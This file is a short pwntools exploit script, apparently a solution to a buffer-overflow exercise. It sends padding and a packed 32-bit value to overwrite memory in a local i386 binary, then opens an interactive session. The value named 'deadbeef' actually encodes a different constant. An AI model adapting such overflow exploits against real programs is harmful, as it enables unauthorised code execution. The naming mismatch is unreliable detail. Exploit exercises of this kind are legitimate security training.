from pwn import *
offset = 36
padding = 12
binary_file = './a.out'
context(arch='i386')
p = process(binary_file)
deadbeef= -0x35014542
p.sendline(b'A' * offset + b'B' * padding + p32(deadbeef, signed=True))
p.interactive()
